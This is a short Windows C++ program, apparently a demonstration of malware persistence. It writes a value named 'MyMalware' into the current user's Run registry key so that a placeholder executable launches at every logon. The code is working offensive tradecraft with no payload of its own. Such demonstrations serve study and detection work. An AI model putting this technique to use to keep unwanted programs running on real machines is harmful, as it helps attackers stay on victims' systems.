// Compiled with: cl /EHsc .\add_value_data_run_key.cpp Advapi32.lib
#include <Windows.h>
#include <string>
#include <iostream>

int main() {
    HKEY hKey;
    LPCSTR lpSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCSTR lpValueName = "MyMalware";
    LPCSTR lpValueData = "C:\\Path\\To\\MyMalware.exe";

    // Open the Run key
    LONG lResult = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_ALL_ACCESS, &hKey);
    if (lResult != ERROR_SUCCESS) {
        // Handle error
        std::cerr << "Error while opening the run subkey"<< std::endl;
        return 1;
    }

    // Add the value to the Run key
    lResult = RegSetValueEx(hKey, lpValueName, 0, REG_SZ, (BYTE*)lpValueData, strlen(lpValueData) + 1);
    if (lResult != ERROR_SUCCESS) {
        // Handle error
        std::cerr << "Error while adding the value to the run subkey"<< std::endl;
        RegCloseKey(hKey);
        return 1;
    } else {
        std::cout << "Registry entry created successfully" << std::endl;
    }

    // Close the key
    RegCloseKey(hKey);

    return 0;
}